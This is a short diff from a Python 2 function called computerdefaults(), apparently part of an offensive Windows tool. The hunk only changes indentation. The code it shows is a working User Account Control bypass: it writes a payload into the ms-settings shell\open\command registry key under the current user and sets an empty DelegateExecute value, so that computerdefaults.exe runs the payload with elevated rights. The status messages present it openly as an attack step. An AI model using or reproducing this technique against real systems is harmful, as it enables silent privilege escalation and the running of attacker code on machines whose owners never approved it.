@@ -30,19 +30,19 @@ def computerdefaults():
 	print " {} computerdefaults: Attempting to create registry key".format(infoBox())
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Software\Classes\ms-settings\shell\open\command"))
+					os.path.join("Software\Classes\ms-settings\shell\open\command"))
 								
 		_winreg.SetValueEx(key,
-							None,
-							0,
-							_winreg.REG_SZ,
-							payload)
+				None,
+				0,
+				_winreg.REG_SZ,
+				payload)
 
 		_winreg.SetValueEx(key,
-							"DelegateExecute",
-							0,
-							_winreg.REG_SZ,
-							None)
+				"DelegateExecute",
+				0,
+				_winreg.REG_SZ,
+				None)
 
 		_winreg.CloseKey(key)
 		print " {} computerdefaults: Registry key created".format(successBox())
